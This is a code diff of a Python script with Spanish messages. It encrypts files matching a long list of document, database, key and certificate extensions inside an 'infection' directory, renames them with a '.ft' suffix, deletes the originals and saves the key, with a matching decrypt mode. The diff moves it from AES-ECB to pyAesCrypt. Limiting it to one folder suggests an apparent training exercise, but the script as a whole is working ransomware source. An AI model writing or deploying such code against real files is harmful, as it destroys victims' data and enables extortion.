@@ -1,9 +1,8 @@
 import os
 import argparse
-import argparse
 import string
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+import pyAesCrypt
+
 
 extensiones = [".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif",
                 ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb",
@@ -18,14 +17,10 @@ extensiones = [".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", "
 
 
 def encrypt_file(file_path, key):
-    with open(file_path, 'rb') as file:
-        data = file.read()
-    cipher = AES.new(key, AES.MODE_ECB)
-    encrypted_data = cipher.encrypt(pad(data, AES.block_size))
-    encrypted_file_path = file_path + '.ft'
-    with open(encrypted_file_path, 'wb') as encrypted_file:
-        encrypted_file.write(encrypted_data)
-    os.remove(file_path)
+    if os.path.isfile(file_path):
+        encrypted_file_path = file_path + '.ft'
+        pyAesCrypt.encryptFile(file_path, encrypted_file_path, key)
+        os.remove(file_path)
 
 
 def encrypt_directory(directory_path, key, silent=False):
@@ -40,14 +35,12 @@ def encrypt_directory(directory_path, key, silent=False):
 
 
 def decrypt_file(file_path, key):
-    with open(file_path, 'rb') as file:
-        data = file.read()
-    cipher = AES.new(key, AES.MODE_ECB)
-    decrypted_data = unpad(cipher.decrypt(data), AES.block_size)
     decrypted_file_path = file_path[:-3]
-    with open(decrypted_file_path, 'wb') as decrypted_file:
-        decrypted_file.write(decrypted_data)
-    os.remove(file_path)
+    try:
+        pyAesCrypt.decryptFile(file_path, decrypted_file_path, key)
+        os.remove(file_path)
+    except:
+        print("Error: La clave de desencriptado no es correcta.")
 
 
 def decrypt_directory(directory_path, key, silent=False):
@@ -104,10 +97,10 @@ def main():
         print('Error: La clave de encriptado contiene caracteres no permitidos.')
         return
     if not args.decrypt:
-        encrypt_infection_directory('infection', args.key, args.silent)
+        encrypt_infection_directory(os.getcwd() + '/infection', args.key, args.silent)
         save_key_to_file(args.key)
     else:
-        decrypt_infection_directory('infection', args.key, args.silent)
+        decrypt_infection_directory(os.getcwd() + '/infection', args.key, args.silent)
 
 
 
